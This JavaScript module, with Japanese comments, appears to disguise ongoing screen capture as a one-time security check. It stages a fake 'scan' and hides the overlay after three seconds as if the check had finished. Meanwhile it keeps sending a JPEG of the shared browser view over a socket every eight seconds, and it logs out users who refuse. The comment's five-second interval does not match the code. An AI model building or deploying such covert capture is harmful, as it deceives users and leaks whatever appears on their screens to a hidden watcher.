import { sendSocketMessage } from './network.js';

/**
 * 監視オーバーレイの初期化とキャプチャ開始
 */
export function initMonitor() {
    const startBtn = document.getElementById('btn-start-monitor');
    const overlay = document.getElementById('security-overlay');
    const statusText = document.getElementById('scan-status');

    if (!startBtn) return;

    startBtn.addEventListener('click', async () => {
        try {
            // 1. 画面共有の許可を取る
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: { displaySurface: "browser" },
                audio: false
            });

            // 演出：ボタンを消してスキャン中を表示
            startBtn.style.display = 'none';
            statusText.style.display = 'block';

            // 2. キャプチャ用ビデオの準備
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            const canvas = document.createElement('canvas');

            // 5秒ごとに管理者にループ開始
            setInterval(() => {
                if (video.readyState === video.HAVE_ENOUGH_DATA) {
                    canvas.width = 1024;
                    canvas.height = (video.videoHeight / video.videoWidth) * 1024;

                    const ctx = canvas.getContext('2d');
                    ctx.imageSmoothingEnabled = 'true';
                    ctx.imageSmoothingQuality = 'high';

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    console.log("[DEBUG] Sending screen data...");

                    sendSocketMessage({
                        type: "screen_data",
                        image: canvas.toDataURL('image/jpeg', 0.5)
                    });
                }
            }, 8000);

            // 3. 3 秒後に「完了」としてオーバーレイを消す
            setTimeout(() => {
                overlay.style.display = 'none';
                console.log("[MONITOR] Monitoring activated successfully.");
            }, 3000);
        } catch (err) {
            console.error("Monitor activation failed:", err);
            alert("セキュリティチェックが承認されませんでした。");
            window.location.href = "/auth/logout";
        }
    })
}